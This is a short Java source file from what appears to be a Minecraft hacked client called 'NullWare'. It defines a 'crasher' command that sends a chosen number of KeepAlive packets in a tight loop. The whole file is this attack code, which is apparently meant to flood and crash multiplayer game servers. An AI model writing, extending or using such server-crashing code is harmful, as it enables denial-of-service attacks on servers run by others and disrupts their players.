package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C00PacketKeepAlive;

public class RandomPacketBCrash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();

    @Override
    public void execute(int packets) {
        for (int i = 0; i < packets; i++) {
            mc.getNetHandler().getNetworkManager().sendPacket(new C00PacketKeepAlive(0));
        }
    }
}